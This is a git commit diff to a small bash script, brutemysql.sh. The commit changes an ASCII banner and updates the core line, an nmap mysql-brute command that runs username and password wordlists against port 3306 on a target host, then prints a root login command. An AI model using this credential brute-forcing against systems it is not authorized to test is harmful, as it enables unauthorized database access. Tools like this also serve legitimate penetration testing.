c8a0927522a9827344b983ec0425219be24e0de4
hackingyseguridad <antonio_taboada@hotmail.es>
2025-10-12 20:56:37 +0200

    Update brutemysql.sh

--- brutemysql.sh
+++ brutemysql.sh
@@ -1,35 +1,13 @@
 #!/bin/bash
 cat << "INFO"
 
-                                                          ..
-                               ,,,                         MM .M
-                           ,!MMMMMMM!,                     MM MM  ,.
-   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
- . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
-;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
- M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
- 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
-  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
- MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
- 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
-  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
-   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
-  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
-  MMM      :M  'MMMMMMMMM brute MySQL MMMMMMM'.MM  MM:M.    'MMMMM
- .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
-AMMM..MMMMM:M.    :M.'MMMMMMMMMMMMMMMMMMMM'.MM'     MM''''''''''''
-MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
- '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
-            MMM.            'MMMM!MMMM'            .MM
-             MMM.             '''   ''            .MM'
-              MMM.                               MMM'
-               MMMM            ,.J.JJJJ.       .MMM'
-                MMMM.       'JJJJJJJ'JJJM   CMMMMM
-                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
-                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
-                      'MMMMMMMMM'JJJJJ JJJJJ'
-                         ''MMMMMMJJJJJJJJJJ'
-                                 'JJJJJJJJ'
+██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███╗   ███╗██╗   ██╗███████╗ ██████╗ ██╗             
+██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ████╗ ████║╚██╗ ██╔╝██╔════╝██╔═══██╗██║             
+██████╔╝██████╔╝██║   ██║   ██║   █████╗      ██╔████╔██║ ╚████╔╝ ███████╗██║   ██║██║             
+██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██║╚██╔╝██║  ╚██╔╝  ╚════██║██║▄▄ ██║██║             
+██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║ ╚═╝ ██║   ██║   ███████║╚██████╔╝███████╗        
+╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝     ╚═╝   ╚═╝   ╚══════╝ ╚══▀▀═╝ ╚══════╝     
+                                              http://www.hackingyseguridad.com/ v1.0 (2025)
 
 INFO
 if [ -z "$1" ]; then
@@ -42,7 +20,7 @@ if [ -z "$1" ]; then
 fi
 echo
 echo
-nmap $1 -p 3306 --script mysql-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
+nmap -Pn $1 -p 3306 --script mysql-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0 -O
 echo
 echo "mysql -h $1 -u root -p "
 echo
